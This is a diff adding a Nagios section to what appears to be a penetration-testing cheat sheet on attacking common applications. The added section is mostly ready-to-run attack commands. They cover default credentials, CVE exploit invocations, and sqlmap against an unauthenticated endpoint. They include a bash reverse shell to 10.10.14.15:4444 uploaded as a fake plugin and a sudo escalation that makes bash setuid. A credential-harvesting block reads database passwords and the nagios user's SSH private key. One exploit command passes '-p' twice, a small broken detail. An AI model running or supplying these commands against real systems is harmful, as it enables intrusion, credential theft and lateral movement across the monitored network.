@@ -1,6 +1,6 @@
 # Attacking Common Applications
 
-#WebApps #CMS #WordPress #Joomla #Drupal #Tomcat #Jenkins #Splunk #PRTG #GitLab #ColdFusion #ThickClient #Exchange #Citrix #F5 #Ivanti #Fortinet #PaloAlto #ManageEngine #TeamCity #Kubernetes #Docker #Zimbra #SolarWinds #Enumeration #RCE
+#WebApps #CMS #WordPress #Joomla #Drupal #Tomcat #Jenkins #Splunk #PRTG #GitLab #ColdFusion #ThickClient #Nagios #Exchange #Citrix #F5 #Ivanti #Fortinet #PaloAlto #ManageEngine #TeamCity #Kubernetes #Docker #Zimbra #SolarWinds #Enumeration #RCE
 
 ## What is this?
 
@@ -684,6 +684,112 @@ strings target.exe | grep -i "pass\|key\|secret\|connect"
 | **phpMyAdmin** | `root:` (no pass) | SQL → write webshell via `SELECT INTO OUTFILE` |
 | **Confluence** | `admin:admin` | CVE-2022-26134 (unauth OGNL injection → RCE) |
 | **MediaWiki** | `admin:admin` | Template injection, file upload, check for `LocalSettings.php` creds |
+
+---
+
+## Nagios
+
+### Overview
+
+Two flavors — **Nagios Core** (open source) and **Nagios XI** (commercial). XI is far more common on enterprise engagements and has a much larger attack surface. Nagios typically runs as the `nagios` user and monitors every host on the network — config files often contain SSH keys, SNMP strings, and WMI credentials for every monitored device.
+
+### Enumeration
+
+```bash
+# Default ports: 80, 443
+# Core path:  /nagios/
+# XI path:    /nagiosxi/
+
+curl -sk http://target.com/nagiosxi/ | grep -i "nagios\|version"
+curl -sk http://target.com/nagios/  # Core
+
+# Version — XI footer or about page
+curl -sk http://target.com/nagiosxi/about.php | grep -i version
+
+# Nmap
+nmap -sV -p 80,443 --script=http-title target.com
+```
+
+**Default credentials:**
+- Nagios XI: `nagiosadmin:nagiosadmin` or `nagiosadmin:PASSW0RD`
+- Nagios Core: `nagiosadmin:nagiosadmin`
+
+### Attacking
+
+**CVE-2021-25296 / 25297 / 25298 — Authenticated OS command injection (Nagios XI < 5.7.5):**
+
+```bash
+# Three separate injection points — Monitored Servers, MIB Manager, Network Interfaces
+python3 CVE-2021-25296.py -t http://target.com/nagiosxi -u nagiosadmin -p nagiosadmin -l 10.10.14.15 -p 4444
+```
+
+**CVE-2019-15949 — Authenticated RCE (Nagios XI < 5.6.6):**
+
+```bash
+# Plugin upload → command injection via filename
+python3 CVE-2019-15949.py -t http://target.com/nagiosxi -u nagiosadmin -p nagiosadmin
+```
+
+**CVE-2023-40931 / 40932 / 40933 / 40934 — SQLi (Nagios XI < 5.11.2):**
+
+```bash
+# Multiple unauthenticated/authenticated SQL injection points
+# /nagiosxi/admin/banner_message-ajaxhelper.php — no auth required
+sqlmap -u 'http://target.com/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=1' \
+  --batch --dbs
+```
+
+**Post-auth RCE via plugin upload (any version with admin access):**
+
+```bash
+# Nagios XI Admin → System Extensions → Manage Plugins → Upload Plugin
+# Upload a "plugin" that is actually a reverse shell script
+cat > shell.sh << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.15/4444 0>&1
+EOF
+# Upload shell.sh as a plugin, then trigger it via a check command
+# Admin → Core Config Manager → Commands → Add new command
+# command_line: /usr/local/nagios/libexec/shell.sh
+```
+
+**Privilege escalation — nagios → root:**
+
+```bash
+# Check sudo rules — very common misconfiguration
+sudo -l
+# Common findings:
+# (root) NOPASSWD: /usr/local/nagiosxi/scripts/
+# (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/cron/
+
+# If nagios user can write plugin dir and sudo execute:
+echo 'chmod +s /bin/bash' > /usr/local/nagios/libexec/evil.sh
+chmod +x /usr/local/nagios/libexec/evil.sh
+sudo /usr/local/nagios/libexec/evil.sh
+/bin/bash -p
+```
+
+### Post-Compromise — Credential Harvesting
+
+```bash
+# Nagios Core config — host/service check credentials
+cat /usr/local/nagios/etc/nagios.cfg
+grep -r "password\|community\|ssh" /usr/local/nagios/etc/
+
+# Nagios XI config and DB
+cat /usr/local/nagiosxi/etc/components/nagiosxi-master.cfg   # DB creds
+mysql -u nagiosxi -p$(grep db_pass /usr/local/nagiosxi/etc/components/nagiosxi-master.cfg | cut -d= -f2) nagiosxi
+
+# SNMP community strings for monitored devices
+grep -r "community" /usr/local/nagios/etc/
+
+# SSH keys used for agentless monitoring
+ls -la /home/nagios/.ssh/
+cat /home/nagios/.ssh/id_rsa
+```
+
+> [!note]
+> Nagios is a lateral movement goldmine. The monitoring account often has SSH access (sometimes key-based, no password) to every Linux host it monitors. Dumping `/usr/local/nagios/etc/` and the XI database frequently yields credentials for a significant portion of the environment.
 
 ---
 
